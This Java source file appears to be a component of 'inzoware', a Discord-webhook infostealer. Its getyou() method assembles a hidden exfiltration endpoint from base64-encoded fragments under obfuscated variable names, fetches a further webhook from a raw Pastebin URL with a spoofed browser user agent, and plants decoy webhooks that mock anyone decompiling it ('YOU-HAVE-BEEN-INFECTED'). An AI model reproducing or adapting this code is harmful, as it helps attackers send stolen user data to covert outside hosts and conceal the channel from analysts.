package com.inzo.technologies.inzoware.hooks;


import java.io.InputStream;
import java.net.URL;
import java.util.ArrayList;
import java.util.Random;
import java.util.Scanner;
import java.util.Base64.Decoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.io.File;

import javax.net.ssl.HttpsURLConnection;

public class Hooks374 {

	
	public static ArrayList<String> realHooks = new ArrayList<>();
	public static ArrayList<String> INZOWEBHOOK = new ArrayList<String>();
	
	public static String getyou() {

		Base64.Decoder dec = Base64.getDecoder();
		String lIllIlIll = "UldybnByRE9JU2ZWaGkwMUxaeg=="; // part 6 of the webhook encoded in base64 (the id)
	    String lIIIllIII = "MTk2NDY2"; // part 3 of the webhook encoded in base64 (the id)
		String IIllIlIll = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0RVYjBIM3R1"; // pastebin url encoded in base64
		String IlIIlIIIl = "elI2X295Vkk1d05WV0F0cw=="; // part 4 of the webhook encoded in base64 (the token)
		String IllIlllIl = "OTI2OTE="; // part 1 of the webhook encoded in base64 (the id)
		String llIIlIlII = "UmdRTEljcEUxNGtoUlJwOTJs"; // part 5 of the webhook encoded in base64 (the token)
		String llIlllIII = "U1Y2R3RQNXlSS2dVT3Bn"; // part 7 of the webhook encoded in base64 (the token)
		String lIIIllIIl = "NzU3NjQyNw=="; // part 2 of the webhook encoded in base64 (the id)
		String lIIlIlIll = "ZGlzY29yZC5jb20=";
		String lIIIIlIll = "YXBp";
		String lIIIIlIlI = "d2ViaG9va3M=";
		String IIllIlIlI = new String(dec.decode(IIllIlIll));
		String IIIIlIIIl = new String(dec.decode(lIIIIlIlI));
		String IIllIlIII = new String(dec.decode(lIllIlIll));
		String lIIlIlIII = new String(dec.decode(lIIIllIII));
		String lIIlIlIlI = new String(dec.decode(IlIIlIIIl));
		String lIlIllIIl = new String(dec.decode(lIIIllIIl));
		String IllIlIlIl = new String(dec.decode(lIIlIlIll));
		String IllIlIIIl = new String(dec.decode(lIIIIlIll));
		String IIlIlllIl = new String(dec.decode(IllIlllIl));
		String llIIIIlII = new String(dec.decode(llIIlIlII));
		String llIlllIlI = new String(dec.decode(llIlllIII));

		if(IIllIlIlI != "") {
			if(IIllIlIlI.contains("pastebin") && IIllIlIlI.contains("raw")) {
				try {
					String userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
					URL url = new URL(IIllIlIlI);
					HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
					connection.setDoOutput(true);
					connection.setRequestMethod("GET");
					InputStream response = connection.getInputStream();
					try(Scanner scanner = new Scanner(response)){
						String responseBody = scanner.useDelimiter("\\A").next();
						INZOWEBHOOK.add(responseBody);
					}catch(Exception e) {
						
					}
				}catch(Exception e) {
					
				}
				
			}else {
				
			}
		}else {
			INZOWEBHOOK.add("https://" + IllIlIlIl + "/" + IllIlIIIl + "/" + IIIIlIIIl + "/" + IIlIlllIl + lIlIllIIl + lIIlIlIII +"/" + lIIlIlIlI + llIIIIlII + IIllIlIII + llIlllIlI);
		}
		realHooks.add("https://discord.com/api/webhooks/INZO-WARE/YOU-HAVE-BEEN-INFECTED");
		realHooks.add("https://discord.com/api/webhooks/INZO-WARE/INJECTION-COMPLETED");
		realHooks.add("https://discord.com/api/webhooks/INZO-WARE/YOU-HAVENT-OF-TRIED-TO-DECOMPILE-THIS");
		Random r = new Random();
		int picked = r.nextInt(INZOWEBHOOK.size());
		String dupedItem = INZOWEBHOOK.get(picked);
		return dupedItem;
	}

}
